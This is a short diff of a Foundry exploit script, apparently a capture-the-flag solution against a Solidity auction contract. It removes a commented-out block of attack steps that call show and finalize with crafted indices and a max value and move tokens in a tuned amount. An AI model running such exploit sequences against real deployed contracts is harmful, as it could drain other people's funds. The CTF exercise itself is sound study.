@@ -91,21 +91,5 @@ contract ExploitScript is Script {
             new bytes32[](0)
         );
         vm.stopBroadcast();
-
-        // vm.startBroadcast(playerPrivateKey);
-        // auction.show(aid, 0x1, new bytes(0));
-        // uint256[] memory indices = new uint256[](2);
-        // indices[0] = 0;
-        // indices[1] = 1;
-        // auction.finalize(aid, indices, amountBase, type(uint128).max);
-        // console.log("Player base token balance:", baseToken.balanceOf(player));
-        // console.log(
-        //     "Auction base token balance:",
-        //     baseToken.balanceOf(address(auction))
-        // );
-        // baseToken.transfer(address(auction), baseToken.balanceOf(player));
-        // quoteToken.transfer(address(auction), 7331547510229267370 - 1e10);
-        // auction.finalize(aid, indices, amountBase, type(uint128).max);
-        // vm.stopBroadcast();
     }
 }
